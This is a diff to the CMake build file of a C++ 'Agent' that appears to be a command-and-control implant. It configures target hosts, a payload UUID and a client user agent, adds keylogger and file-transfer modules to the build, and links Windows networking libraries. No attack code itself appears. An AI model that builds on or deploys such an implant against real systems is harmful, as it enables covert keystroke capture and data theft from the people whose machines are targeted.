@@ -11,6 +11,7 @@ endif()
 
 project (Agent)
 
+
 # Hosts List Configuration
 set(INPUT_HOSTS "localhost" CACHE STRING "List of target host addresses")
 string(STRIP "${INPUT_HOSTS}" INPUT_HOSTS)
@@ -28,7 +29,7 @@ string(STRIP "${PORT}" CLEAN_PORT)
 set(INPUT_USER_AGENT "Trinity Agent Client/1.0" CACHE STRING "The user agent for requests")
 
 # Agent Header Configuration
-set(INPUT_REQUEST_HEADER "Content-Type: application/json\r\n" CACHE STRING "The agent request header")
+set(INPUT_REQUEST_HEADER "Content-Type: application/json" CACHE STRING "The agent request header")
 
 # Add source to this project's executable.
 add_executable (
@@ -45,6 +46,10 @@ add_executable (
   "include/TaskQueueManager.h"
   "include/Task.h"
   "include/Command.h"
+  "src/Keylogger.cpp"
+  "include/Keylogger.h"
+  "src/FileTransfer.cpp"
+  "include/FileTransfer.h"
 )
 
 target_include_directories(Agent PRIVATE ${CMAKE_CURRENT_SOURCE_DIR}/external)
@@ -55,6 +60,7 @@ target_compile_definitions(Agent PRIVATE COMM_PAYLOAD_UUID="${INPUT_PAYLOAD_UUID
 target_compile_definitions(Agent PRIVATE COMM_USER_AGENT="${INPUT_USER_AGENT}")
 target_compile_definitions(Agent PRIVATE COMM_PORT=${CLEAN_PORT})
 target_compile_definitions(Agent PRIVATE COMM_REQUEST_HEADER="${INPUT_REQUEST_HEADER}")
+target_link_libraries(Agent PRIVATE winhttp iphlpapi ws2_32 psapi)
 
 
 if (CMAKE_VERSION VERSION_GREATER 3.12)
